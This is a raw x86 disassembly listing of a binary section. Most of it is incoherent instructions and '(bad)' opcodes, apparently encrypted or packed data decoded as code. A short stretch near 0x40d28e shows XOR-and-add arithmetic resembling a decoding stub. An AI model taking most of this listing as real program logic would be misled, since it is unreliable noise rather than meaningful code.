  40cc80:	adc    ecx,DWORD PTR [edx+0x75]
  40cc83:	sbb    edi,DWORD PTR [ebx+0x78bcd70d]
  40cc89:	push   es
  40cc8a:	add    DWORD PTR [edx+0x23740a9a],0xffffff93
  40cc91:	mov    bh,BYTE PTR [edx]
  40cc93:	cs adc edx,eax
  40cc96:	aaa    
  40cc97:	imul   ebx,DWORD PTR [esi-0x2d2f2fa9],0x62ae335c
  40cca1:	imul   edi,DWORD PTR [edi-0x4dcbe8be],0xffffffff
  40cca8:	jns    0x40ccaa
  40ccaa:	push   cs
  40ccab:	push   0xfbc577c6
  40ccb0:	or     BYTE PTR [edx+0x1d],0x8e
  40ccb4:	popa   
  40ccb5:	sbb    al,0x52
  40ccb7:	inc    edx
  40ccb8:	sahf   
  40ccb9:	jne    0x40cd2e
  40ccbb:	mov    cl,0xc1
  40ccbd:	sti    
  40ccbe:	cmp    al,0xc4
  40ccc0:	ins    DWORD PTR es:[edi],dx
  40ccc1:	or     BYTE PTR [ecx+eiz*8-0x25dde2fc],ch
  40ccc8:	(bad)  
  40ccc9:	or     ah,BYTE PTR [edi-0x6b]
  40cccc:	jnp    0x40cd06
  40ccce:	mov    esi,ebp
  40ccd0:	push   edi
  40ccd1:	mov    eax,ds:0x7ff5d37e
  40ccd6:	mov    edi,0x72cef427
  40ccdb:	cmp    eax,0x77c97799
  40cce0:	xchg   edx,eax
  40cce1:	cmp    al,0x55
  40cce3:	inc    edi
  40cce4:	xchg   ebp,ebx
  40cce6:	pop    esi
  40cce7:	dec    esp
  40cce8:	mov    dh,BYTE PTR [edx]
  40ccea:	mov    ds:0x16bb732e,eax
  40ccef:	repz sub BYTE PTR [ebx-0x76be16d4],bh
  40ccf6:	inc    edi
  40ccf8:	add    bh,al
  40ccfa:	cs cld 
  40ccfc:	pop    edx
  40ccfd:	sbb    al,0x17
  40ccff:	cmc    
  40cd00:	pop    ecx
  40cd01:	cmp    DWORD PTR ds:0x9c65bb37,esi
  40cd07:	or     eax,0x653a87c7
  40cd0c:	cmp    ebp,DWORD PTR [edi-0x32]
  40cd0f:	mov    cl,0x51
  40cd11:	push   ecx
  40cd12:	push   0xffffff90
  40cd14:	int    0x6c
  40cd16:	data16 jl 0x40cd54
  40cd19:	or     ebp,DWORD PTR [esi-0x4f219435]
  40cd1f:	sbb    eax,0x97452a43
  40cd24:	push   es
  40cd25:	inc    DWORD PTR [edi-0x6d19920f]
  40cd2b:	(bad)  
  40cd2c:	push   cs
  40cd2d:	aaa    
  40cd2e:	add    al,BYTE PTR [edx+0x55]
  40cd31:	loopne 0x40ccca
  40cd33:	fcmovnu st,st(6)
  40cd35:	and    BYTE PTR [esi+0x689949bf],ah
  40cd3b:	xlat   BYTE PTR ds:[ebx]
  40cd3c:	pop    ss
  40cd3d:	sbb    ebp,esp
  40cd3f:	cli    
  40cd40:	loope  0x40cce1
  40cd42:	sbb    bl,0x11
  40cd45:	xchg   edi,eax
  40cd46:	jmp    0x40cccb
  40cd48:	imul   edx,DWORD PTR [ecx-0x367ad372],0x366da52f
  40cd52:	scas   eax,DWORD PTR es:[edi]
  40cd53:	test   esi,edi
  40cd55:	aaa    
  40cd56:	lods   al,BYTE PTR ds:[esi]
  40cd57:	call   0xe62a:0x855f1ceb
  40cd5e:	aam    0x57
  40cd60:	ret    
  40cd61:	push   0x460996ec
  40cd66:	stc    
  40cd67:	sub    bl,BYTE PTR [ebx]
  40cd69:	pop    eax
  40cd6a:	xchg   DWORD PTR [esi-0x4d7ea2d8],esp
  40cd70:	cmp    dl,BYTE PTR [eax-0x6b330f3b]
  40cd76:	test   edi,0x9ac1ea03
  40cd7c:	xchg   esi,eax
  40cd7d:	mov    ecx,0xbcbeaae4
  40cd82:	not    DWORD PTR ds:0xceeb699d
  40cd88:	or     edx,eax
  40cd8a:	pop    esp
  40cd8b:	pop    es
  40cd8c:	(bad)  
  40cd8d:	cmp    al,0x67
  40cd8f:	push   ebx
  40cd90:	sub    eax,0x9d484f6e
  40cd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd96:	stc    
  40cd97:	dec    eax
  40cd98:	into   
  40cd99:	repz bswap edi
  40cd9c:	lock aaa 
  40cd9e:	and    al,0x2
  40cda0:	jge    0x40ce0f
  40cda2:	mov    ecx,DWORD PTR [edi-0x6c013be]
  40cda8:	sub    al,0x1c
  40cdaa:	test   al,0x6
  40cdac:	fnstsw WORD PTR [eax+0x159329b4]
  40cdb2:	retf   
  40cdb3:	not    BYTE PTR ds:0xe6931a4e
  40cdb9:	or     edx,DWORD PTR [ebx]
  40cdbb:	das    
  40cdbc:	cmp    ebp,DWORD PTR [edi-0x10]
  40cdbf:	nop
  40cdc0:	xor    eax,0x48332994
  40cdc5:	test   BYTE PTR [ecx-0x608eda48],dh
  40cdcb:	sbb    eax,0x9e9f2d2c
  40cdd0:	push   ecx
  40cdd1:	(bad)  
  40cdd2:	jns    0x40cd6e
  40cdd4:	dec    esi
  40cdd5:	sbb    eax,0xeb1b3880
  40cdda:	mov    dl,0xf9
  40cddc:	mov    ds:0xfa2f604a,eax
  40cde1:	sbb    al,0x79
  40cde3:	inc    ebp
  40cde4:	mov    DWORD PTR [ecx],ebp
  40cde6:	stos   BYTE PTR es:[edi],al
  40cde7:	jbe    0x40cdfa
  40cde9:	jae    0x40ce02
  40cdeb:	mov    WORD PTR [esi-0x6d],ss
  40cdee:	sahf   
  40cdef:	ficom  WORD PTR [eax+0x39d0616d]
  40cdf5:	popf   
  40cdf6:	js     0x40ce75
  40cdf8:	cs test al,0x6b
  40cdfb:	sub    eax,0x99e0091b
  40ce00:	cs enter 0x7e42,0xc
  40ce05:	in     al,0xee
  40ce07:	loope  0x40cd8f
  40ce09:	mov    esp,edx
  40ce0b:	fiadd  DWORD PTR [esp]
  40ce0e:	test   cl,0x3a
  40ce11:	out    0x99,eax
  40ce13:	leave  
  40ce14:	(bad)  
  40ce15:	(bad)  
  40ce16:	test   eax,0x91855c58
  40ce1b:	mov    bh,0x6a
  40ce1d:	sub    bh,BYTE PTR [edi]
  40ce1f:	imul   edi,DWORD PTR [edi],0xffffffac
  40ce22:	and    al,0x4d
  40ce24:	sahf   
  40ce25:	pop    ds
  40ce26:	dec    esp
  40ce27:	push   esi
  40ce28:	mov    ebx,0x4fdb01eb
  40ce2d:	xchg   ecx,eax
  40ce2e:	aam    0x55
  40ce30:	enter  0xdda0,0x6a
  40ce34:	adc    dh,BYTE PTR [eax+0x67]
  40ce37:	cwde   
  40ce38:	retf   
  40ce39:	(bad)  
  40ce3a:	xor    al,0x25
  40ce3c:	push   0x4e
  40ce3e:	push   ecx
  40ce3f:	in     al,dx
  40ce40:	sahf   
  40ce41:	frstor [esi+0x75]
  40ce44:	stos   DWORD PTR es:[edi],eax
  40ce45:	and    eax,ebp
  40ce47:	pop    eax
  40ce48:	jno    0x40ce98
  40ce4a:	xchg   edi,edx
  40ce4c:	test   al,ch
  40ce4e:	lahf   
  40ce4f:	mov    dl,0x6c
  40ce51:	cs fwait
  40ce53:	in     eax,dx
  40ce54:	and    cl,bh
  40ce56:	add    BYTE PTR [edi+0x1c],al
  40ce59:	mov    ebx,eax
  40ce5b:	cdq    
  40ce5c:	xor    DWORD PTR [ecx+0x4be266bd],edi
  40ce62:	sbb    ch,cl
  40ce64:	fidiv  WORD PTR [ecx]
  40ce66:	out    0xc8,al
  40ce68:	mov    edx,DWORD PTR [edx]
  40ce6a:	pop    DWORD PTR [esi]
  40ce6c:	mov    DWORD PTR [edi],0xe75a2645
  40ce72:	outs   dx,DWORD PTR ds:[esi]
  40ce73:	popf   
  40ce74:	push   ds
  40ce75:	push   0x949ffdff
  40ce7a:	sbb    BYTE PTR [ebp-0x67],bh
  40ce7d:	hlt    
  40ce7e:	repnz imul esi,DWORD PTR [edx+ecx*2+0x34],0xfffffff6
  40ce84:	inc    esp
  40ce85:	pop    esp
  40ce86:	cdq    
  40ce87:	and    bl,BYTE PTR [ecx]
  40ce89:	enter  0x1eae,0x59
  40ce8d:	int    0x34
  40ce8f:	clc    
  40ce90:	and    eax,0x2df3947c
  40ce95:	or     DWORD PTR [edx+ebp*4-0x22],esp
  40ce99:	sbb    dl,bl
  40ce9b:	in     eax,dx
  40ce9c:	mov    ch,0x8c
  40ce9e:	es cmp dl,al
  40cea1:	rcl    BYTE PTR [edx-0x1ad6cdb],cl
  40cea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea8:	xor    edx,ebx
  40ceaa:	sbb    BYTE PTR [ecx-0x67405fee],dh
  40ceb0:	inc    ecx
  40ceb1:	(bad)  
  40ceb2:	sbb    al,0xaa
  40ceb4:	and    al,BYTE PTR [esi+0x16c4d3a6]
  40ceba:	xor    al,0x28
  40cebc:	(bad)  
  40cebd:	retf   
  40cebe:	dec    ecx
  40cebf:	pop    edx
  40cec0:	test   al,0x97
  40cec2:	xchg   edx,eax
  40cec3:	sbb    DWORD PTR [edi],ebp
  40cec5:	aam    0xb4
  40cec7:	rcl    BYTE PTR [edx+0x2f],1
  40ceca:	mov    edx,ebx
  40cecc:	das    
  40cecd:	fmul   st(2),st
  40cecf:	or     bh,al
  40ced1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ced2:	int3   
  40ced3:	dec    ecx
  40ced4:	xchg   BYTE PTR [ecx-0x5d],al
  40ced7:	inc    esi
  40ced8:	xchg   ebx,eax
  40ced9:	mov    BYTE PTR [edi+0x57],0x8c
  40cedd:	push   ebx
  40cede:	out    0x77,eax
  40cee0:	inc    esp
  40cee1:	lods   al,BYTE PTR ds:[esi]
  40cee2:	aad    0xd4
  40cee4:	mov    ecx,0xccb21d7d
  40cee9:	add    al,0xd6
  40ceeb:	xchg   esp,eax
  40ceec:	nop
  40ceed:	mov    WORD PTR [esi],gs
  40ceef:	popf   
  40cef0:	call   0xc3779f07
  40cef5:	and    BYTE PTR cs:[edx],dh
  40cef8:	sbb    ch,BYTE PTR [ebx]
  40cefa:	aas    
  40cefb:	jnp    0x40ceda
  40cefd:	mov    eax,ds:0xa9921a98
  40cf02:	(bad)
  40cf05:	lods   eax,DWORD PTR ds:[esi]
  40cf06:	nop
  40cf07:	pop    ds
  40cf08:	inc    ebx
  40cf09:	mov    ah,0x2b
  40cf0b:	or     eax,ecx
  40cf0d:	push   es
  40cf0e:	call   0x460b:0xa1b90847
  40cf15:	jno    0x40ced2
  40cf17:	add    al,0xc8
  40cf19:	test   BYTE PTR [ebp-0x1e0c0036],dh
  40cf1f:	push   esp
  40cf20:	sbb    edi,DWORD PTR [bp+si]
  40cf23:	in     al,dx
  40cf24:	mov    ch,0x97
  40cf26:	ja     0x40cef1
  40cf28:	bound  edi,QWORD PTR [esi+edi*2-0x48181f42]
  40cf2f:	pop    edi
  40cf30:	ja     0x40cf79
  40cf32:	and    eax,ebx
  40cf34:	xor    DWORD PTR [edi+0x48a973b9],edi
  40cf3a:	jmp    0x40cf75
  40cf3c:	adc    al,0x9f
  40cf3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf3f:	mov    edx,0xda982b4d
  40cf44:	bound  eax,QWORD PTR [ecx]
  40cf46:	add    BYTE PTR [edi-0x4e44c56d],dh
  40cf4c:	pop    ebx
  40cf4d:	push   es
  40cf4e:	sub    al,0xea
  40cf50:	mov    ecx,0x30c458b
  40cf55:	inc    ebp
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x97
  40cf80:	hlt    
  40cf81:	add    bl,bl
  40cf83:	and    DWORD PTR [esi+0x7d7d7e7e],edx
  40cf89:	jle    0x40d009
  40cf8b:	test   eax,0x37b6134
  40cf90:	or     ebx,DWORD PTR [edi]
  40cf92:	cwde   
  40cf93:	aaa    
  40cf94:	add    ch,dh
  40cf96:	outs   dx,DWORD PTR ds:[esi]
  40cf97:	cmp    esp,ecx
  40cf99:	shl    DWORD PTR [edx+0x6],1
  40cf9c:	iret   
  40cf9d:	add    ebp,DWORD PTR [eax]
  40cf9f:	pop    es
  40cfa0:	sub    esi,DWORD PTR [ebx+0x354771a5]
  40cfa6:	lods   eax,DWORD PTR ds:[esi]
  40cfa7:	and    DWORD PTR [ebx+0x22],0x5b
  40cfab:	adc    ah,BYTE PTR [eax+0x10492579]
  40cfb1:	sbb    eax,0xcddc1da2
  40cfb6:	jns    0x40cf66
  40cfb8:	dec    edi
  40cfb9:	jle    0x40cf72
  40cfbb:	pop    eax
  40cfbc:	push   cs
  40cfbd:	jns    0x40cf88
  40cfbf:	xor    al,0x59
  40cfc1:	mov    ebp,0x2187ca0
  40cfc6:	leave  
  40cfc7:	xchg   ebx,eax
  40cfc8:	cmp    eax,0xcbd2b3c9
  40cfce:	pusha  
  40cfcf:	les    eax,FWORD PTR [esi-0x4eef6290]
  40cfd5:	xchg   edi,eax
  40cfd6:	(bad)  
  40cfd7:	int3   
  40cfd8:	hlt    
  40cfd9:	cdq    
  40cfda:	or     eax,0xa3bee6fc
  40cfdf:	add    BYTE PTR [edx+eiz*1-0x1d],dh
  40cfe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfe4:	jg     0x40d065
  40cfe6:	xlat   BYTE PTR fs:[ebx]
  40cfe8:	arpl   di,sp
  40cfea:	or     bl,BYTE PTR [edi+0x3a]
  40cfed:	scas   al,BYTE PTR es:[edi]
  40cfee:	sbb    DWORD PTR [edi-0x17d62f10],ecx
  40cff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff5:	dec    edi
  40cff6:	sbb    BYTE PTR [eax-0x43e8b680],al
  40cffc:	xchg   ebp,eax
  40cffd:	imul   ebx,DWORD PTR [ebx],0xffffff81
  40d000:	sbb    BYTE PTR [ebp-0x7f360708],bl
  40d006:	lea    ebp,ds:0x9cf981ef
  40d00c:	lods   al,BYTE PTR ds:[esi]
  40d00d:	stos   DWORD PTR es:[edi],eax
  40d00e:	outs   dx,BYTE PTR ds:[esi]
  40d00f:	cwde   
  40d010:	(bad)
  40d013:	in     eax,dx
  40d014:	lds    edx,FWORD PTR [ebp+0x4b]
  40d017:	jo     0x40d006
  40d019:	aam    0x74
  40d01b:	adc    ecx,DWORD PTR [ebp+edx*4+0x3cb7d29e]
  40d022:	xchg   edx,eax
  40d023:	xchg   ebx,eax
  40d024:	jle    0x40d004
  40d026:	int3   
  40d027:	test   al,0x8a
  40d029:	(bad)  
  40d02a:	xor    al,0x80
  40d02c:	mov    BYTE PTR [esi],bl
  40d02e:	ins    BYTE PTR es:[edi],dx
  40d02f:	jg     0x40cfe3
  40d031:	int3   
  40d032:	or     dh,bl
  40d034:	popa   
  40d035:	and    dh,BYTE PTR [ecx]
  40d037:	mov    si,0xc296
  40d03b:	and    eax,DWORD PTR [edi-0x17]
  40d03e:	sbb    dh,BYTE PTR [ecx+ecx*4]
  40d041:	xchg   esi,eax
  40d042:	xchg   edi,eax
  40d043:	ins    DWORD PTR es:[edi],dx
  40d044:	inc    ecx
  40d045:	inc    eax
  40d046:	sbb    DWORD PTR [esi+ecx*1-0x6c8c7138],esi
  40d04d:	std    
  40d04e:	mov    esi,0x82b0cfb7
  40d053:	xchg   eax,edx
  40d055:	sub    al,0x8c
  40d057:	add    DWORD PTR [ecx],edi
  40d059:	aam    0x1e
  40d05b:	js     0x40d0cc
  40d05d:	icebp  
  40d05e:	jne    0x40d0cc
  40d060:	push   esi
  40d061:	pop    es
  40d062:	test   ch,cl
  40d064:	push   eax
  40d065:	dec    edi
  40d066:	dec    esi
  40d067:	or     eax,0xdce6264a
  40d06c:	sub    BYTE PTR [ebp+0x5],bh
  40d06f:	add    BYTE PTR [eax-0x24],ch
  40d072:	fstp   TBYTE PTR [edi]
  40d074:	sbb    edx,DWORD PTR [eax-0xc6f1a12]
  40d07a:	js     0x40d04a
  40d07c:	arpl   WORD PTR [ecx-0x70],si
  40d07f:	inc    esi
  40d080:	stos   DWORD PTR es:[edi],eax
  40d081:	adc    DWORD PTR [ecx+eax*1-0x3e],0x70c4050e
  40d089:	pusha  
  40d08a:	pop    eax
  40d08b:	fs xchg edx,eax
  40d08d:	inc    esp
  40d08e:	(bad)  
  40d090:	into   
  40d091:	mov    edx,0x41bf11f
  40d096:	das    
  40d097:	test   BYTE PTR [edx-0xd5f3815],0x46
  40d09e:	xor    DWORD PTR [eax+0x7b],edx
  40d0a1:	push   0xffffff96
  40d0a3:	xchg   ecx,eax
  40d0a4:	pop    esi
  40d0a5:	push   0x29c55d72
  40d0aa:	jno    0x40d0f6
  40d0ac:	jo     0x40d0d9
  40d0ae:	jge    0x40d10e
  40d0b0:	dec    ebp
  40d0b1:	cli    
  40d0b2:	dec    edi
  40d0b3:	scas   al,BYTE PTR es:[edi]
  40d0b4:	xchg   edx,eax
  40d0b5:	mov    ecx,0x256b8212
  40d0ba:	pusha  
  40d0bb:	leave  
  40d0bc:	sahf   
  40d0bd:	push   eax
  40d0be:	or     eax,0x7698c9a7
  40d0c3:	fst    DWORD PTR [ecx-0x77]
  40d0c6:	loope  0x40d094
  40d0c8:	cli    
  40d0c9:	(bad)  
  40d0ca:	mov    cl,0xf5
  40d0cc:	dec    ebp
  40d0cd:	or     ch,BYTE PTR [ebx+eiz*2+0xa]
  40d0d1:	popf   
  40d0d2:	push   ds
  40d0d3:	fdivr  DWORD PTR [edx-0x1]
  40d0d6:	xor    eax,0x390e8eca
  40d0db:	adc    eax,0xbdcb61a1
  40d0e0:	sbb    al,0x5f
  40d0e2:	imul   ecx,DWORD PTR [ecx-0x5c],0xfffffff5
  40d0e6:	adc    dh,dh
  40d0e8:	aaa    
  40d0e9:	jbe    0x40d12b
  40d0eb:	cli    
  40d0ec:	xor    edx,DWORD PTR [ebx]
  40d0ee:	and    eax,0xfe608d6
  40d0f3:	sbb    DWORD PTR [esp+edi*1-0x80],ebp
  40d0f7:	sub    BYTE PTR [edx-0x535d9e7d],cl
  40d0fd:	sub    dl,BYTE PTR [edi+0x299313d9]
  40d103:	imul   esi,DWORD PTR [eax],0xffffffd0
  40d106:	xchg   edi,eax
  40d107:	jae    0x40d147
  40d109:	pop    ebx
  40d10a:	loopne 0x40d147
  40d10c:	mov    WORD PTR [esi],?
  40d10e:	sub    ebp,eax
  40d110:	cmp    ebp,eax
  40d112:	inc    ebx
  40d113:	fimul  DWORD PTR [eax+0x19]
  40d116:	imul   ebx,DWORD PTR [eax],0x19
  40d119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d11a:	dec    edi
  40d11b:	push   ss
  40d11c:	ds jb  0x40d0a9
  40d11f:	(bad)  
  40d120:	pop    edx
  40d121:	mov    esi,0x5d0699cf
  40d126:	sub    BYTE PTR [edx],ch
  40d128:	pop    edi
  40d129:	call   0x29645eb6
  40d12e:	fadd   st(0),st
  40d130:	dec    esp
  40d131:	inc    edx
  40d132:	mov    ecx,DWORD PTR [esi+0x23c6a467]
  40d138:	out    0xf9,eax
  40d13a:	inc    esp
  40d13b:	jno    0x40d139
  40d13d:	adc    ch,BYTE PTR [edx-0x355203fa]
  40d143:	shl    BYTE PTR [ecx],cl
  40d145:	jge    0x40d119
  40d147:	les    edx,FWORD PTR [ebx+eiz*1]
  40d14a:	and    al,0x48
  40d14c:	cld    
  40d14d:	test   eax,0x8594aaa0
  40d152:	ret    0xce3c
  40d155:	mov    esp,0xfcea763f
  40d15a:	dec    esp
  40d15b:	ret    
  40d15c:	sbb    bl,dl
  40d15e:	(bad)  
  40d15f:	xchg   ebp,eax
  40d160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d161:	pusha  
  40d162:	in     al,0x94
  40d164:	cwde   
  40d165:	mov    ah,0xcb
  40d167:	ins    BYTE PTR es:[edi],dx
  40d168:	pop    ecx
  40d169:	sub    esp,esi
  40d16b:	pop    esi
  40d16c:	clc    
  40d16d:	sbb    al,0x22
  40d16f:	inc    esi
  40d170:	push   cs
  40d171:	pop    ebp
  40d172:	(bad)  
  40d173:	push   esi
  40d174:	or     edi,DWORD PTR ds:0x8060c2
  40d17a:	pop    edi
  40d17b:	mov    ds:0x60f0ef98,eax
  40d180:	pop    edx
  40d181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d182:	sub    DWORD PTR [ebx+0x63f1e838],edi
  40d188:	je     0x40d13d
  40d18a:	and    ebx,DWORD PTR [eax]
  40d18c:	loop   0x40d1c0
  40d18e:	mov    cs,WORD PTR [ebp-0x500c55bc]
  40d194:	popa   
  40d195:	push   esp
  40d196:	jge    0x40d183
  40d198:	lods   al,BYTE PTR ds:[esi]
  40d199:	mov    ebp,0xc7d839f3
  40d19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d19f:	mov    ah,0x5
  40d1a1:	mov    edi,0xd75eceac
  40d1a6:	outs   dx,BYTE PTR ds:[esi]
  40d1a7:	mov    gs,WORD PTR [edi]
  40d1a9:	and    BYTE PTR [esi-0x65fe6ba3],bl
  40d1af:	mov    ds:0x2333bf27,al
  40d1b4:	sbb    BYTE PTR [eax],dl
  40d1b6:	imul   ebx,DWORD PTR [ebx+0x46],0xe13918f1
  40d1bd:	mov    ds:0xfe563834,eax
  40d1c2:	enter  0x2161,0x22
  40d1c6:	jns    0x40d172
  40d1c8:	mov    DWORD PTR [esi],ecx
  40d1ca:	xchg   esi,eax
  40d1cb:	inc    ebx
  40d1cc:	aam    0xfe
  40d1ce:	iret   
  40d1cf:	mov    esi,0x153de77e
  40d1d4:	aas    
  40d1d5:	push   esi
  40d1d6:	sti    
  40d1d7:	mov    es,WORD PTR [edx+0x2a]
  40d1da:	dec    esi
  40d1db:	addr16 popf 
  40d1dd:	add    BYTE PTR [edx+0x38],0x64
  40d1e1:	jbe    0x40d237
  40d1e3:	stc    
  40d1e4:	fild   QWORD PTR [ebp+ebp*1-0x51]
  40d1e8:	shl    BYTE PTR [edx-0x1],1
  40d1eb:	sub    al,0x6b
  40d1ed:	(bad)  
  40d1ee:	xchg   esp,eax
  40d1ef:	sti    
  40d1f0:	pop    edi
  40d1f1:	ror    BYTE PTR [ebp+0x60],cl
  40d1f4:	pop    ebx
  40d1f5:	in     al,dx
  40d1f6:	je     0x40d1fa
  40d1f8:	jmp    0x40d214
  40d1fa:	push   esi
  40d1fb:	dec    esi
  40d1fc:	lds    esp,FWORD PTR [edi]
  40d1fe:	xor    esi,esi
  40d200:	fbld   TBYTE PTR [ebx]
  40d202:	dec    esi
  40d203:	shl    DWORD PTR [edx-0x607be9bf],1
  40d209:	add    DWORD PTR [esi+0x40829bf3],ebx
  40d20f:	std    
  40d210:	push   esi
  40d211:	xchg   ecx,eax
  40d212:	test   al,0x8b
  40d214:	daa    
  40d215:	fsub   st,st(0)
  40d217:	shl    DWORD PTR [edi+0xcfb5c74],1
  40d21d:	dec    edx
  40d21e:	mov    al,0x94
  40d220:	jae    0x40d1ff
  40d222:	mov    eax,0x4bd323fc
  40d227:	mov    esp,0xb7854bc2
  40d22c:	je     0x40d1f8
  40d22e:	cmp    BYTE PTR [edx],bl
  40d230:	mov    bl,0x6a
  40d232:	mov    ah,0x41
  40d234:	icebp  
  40d235:	xchg   ebx,eax
  40d236:	adc    bh,BYTE PTR [edx+ebx*2]
  40d239:	sub    eax,0xf1fe8f70
  40d23e:	retf   
  40d23f:	in     eax,0x26
  40d241:	fcmovnb st,st(7)
  40d243:	sub    DWORD PTR [ebx+eax*1-0x67],edx
  40d247:	xor    eax,ebx
  40d249:	mov    dh,0xdd
  40d24b:	(bad)  
  40d24c:	jmp    0x4e80:0x418f6b02
  40d253:	cmp    DWORD PTR [eax-0x5b],ecx
  40d256:	in     eax,0xea
  40d258:	imul   edx
  40d25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25b:	call   0x509a:0x976fb175
  40d262:	pop    es
  40d263:	xor    DWORD PTR [ebp-0x2d],0x1a
  40d267:	mov    dh,0x65
  40d269:	add    al,0xb5
  40d26b:	icebp  
  40d26c:	mov    dh,0xe4
  40d26e:	fwait
  40d26f:	pop    ds
  40d270:	ror    BYTE PTR [edx],0x34
  40d273:	leave  
  40d274:	pop    edi
  40d275:	call   0x28edce5f
  40d27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d27b:	int    0xbf
  40d27d:	inc    ebx
  40d27e:	xchg   ecx,eax
  40d27f:	pop    bx
  40d281:	ins    BYTE PTR es:[edi],dx
  40d282:	retf   
  40d283:	mov    eax,ds:0x50598b42
  40d288:	stos   BYTE PTR es:[edi],al
  40d289:	imul   ebx,DWORD PTR [edx],0x62
  40d28c:	fidiv  DWORD PTR [ebx]
  40d28e:	pop    ebx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	aad    0x15
  40d2d2:	sbb    eax,0x7e952c12
  40d2d7:	jle    0x40d356
  40d2d9:	jge    0x40d359
  40d2db:	jle    0x40d350
  40d2dd:	aas    
  40d2de:	mov    ds:0xa09b3b92,al
  40d2e3:	and    edi,esp
  40d2e5:	test   al,0x51
  40d2e7:	imul   BYTE PTR [esi+esi*1-0x1e]
  40d2eb:	icebp  
  40d2ec:	test   al,0xc8
  40d2ee:	or     DWORD PTR [eax-0xcf053dd],eax
  40d2f4:	pop    ebx
  40d2f5:	pop    es
  40d2f6:	dec    esp
  40d2f7:	jnp    0x40d354
  40d2f9:	sub    dh,BYTE PTR [ebp-0x2cf13967]
  40d2ff:	dec    edi
  40d300:	lahf   
  40d301:	or     al,0xed
  40d303:	fwait
  40d304:	adc    al,0x42
  40d306:	push   esp
  40d307:	mov    ah,0x36
  40d309:	retf   0xcc13
  40d30c:	ret    
  40d30d:	or     bh,al
  40d30f:	cmp    al,0x4e
  40d311:	push   edx
  40d312:	jo     0x40d358
  40d314:	mov    eax,0xc3ae2795
  40d319:	imul   eax,edi,0x48
  40d31c:	jp     0x40d2eb
  40d31e:	mov    edx,0x63b8e054
  40d323:	clc    
  40d324:	jae    0x40d2d6
  40d326:	test   al,0xf7
  40d328:	int3   
  40d329:	xor    edx,DWORD PTR [ecx]
  40d32b:	add    dh,BYTE PTR [esp+ecx*8+0x5c]
  40d32f:	cdq    
  40d330:	jp     0x40d33d
  40d332:	push   cs
  40d333:	popf   
  40d334:	loope  0x40d37c
  40d336:	fs xor ecx,ebp
  40d339:	retf   
  40d33a:	je     0x40d340
  40d33c:	(bad)  
  40d33e:	fnsave [eax]
  40d340:	mov    cl,0x84
  40d342:	and    bh,ch
  40d344:	addr16 fsubr QWORD PTR [bp+0x55]
  40d349:	gs test eax,0xe6297e80
  40d34f:	test   edi,ebp
  40d351:	mov    ds:0x57537d71,eax
  40d356:	repnz xor DWORD PTR [edx-0x58],esi
  40d35a:	sbb    eax,0x143bb5fc
  40d35f:	pop    ebx
  40d360:	mov    bl,0xef
  40d362:	mov    al,0x1
  40d364:	scas   al,BYTE PTR es:[edi]
  40d365:	add    bl,BYTE PTR [eax-0x40e0934c]
  40d36b:	pmaddwd mm7,QWORD PTR [ebx]
  40d36e:	mov    al,0x75
  40d370:	pop    eax
  40d371:	dec    ebx
  40d372:	ss sbb ah,BYTE PTR fs:[ebx+ebp*8-0x50]
  40d378:	ja     0x40d31b
  40d37a:	push   edi
  40d37b:	mov    eax,ds:0x7f189fa
  40d380:	and    esi,DWORD PTR [ecx+0xd186eca]
  40d386:	ss test eax,0x44be7fa1
  40d38c:	jp     0x40d37c
  40d38e:	ins    DWORD PTR es:[edi],dx
  40d38f:	pop    ds
  40d390:	test   DWORD PTR ds:0xfb39f971,0xbd4dd0ae
  40d39a:	ja     0x40d40b
  40d39c:	test   al,0x6a
  40d39e:	add    al,0x69
  40d3a0:	xchg   ebp,eax
  40d3a1:	repnz inc esp
  40d3a3:	push   ebp
  40d3a4:	or     dl,al
  40d3a6:	dec    ebx
  40d3a7:	mov    WORD PTR [ecx-0x47],es
  40d3aa:	jne    0x40d3e4
  40d3ac:	ss stc 
  40d3ae:	xor    BYTE PTR [ebp-0xf17c466],al
  40d3b4:	mov    eax,ds:0x7735ab07
  40d3b9:	push   es
  40d3ba:	adc    ebp,DWORD PTR [ecx]
  40d3bc:	repnz enter 0xb6a9,0xb3
  40d3c1:	push   0x5579ed2f
  40d3c6:	sbb    eax,0xb5010283
  40d3cb:	inc    esp
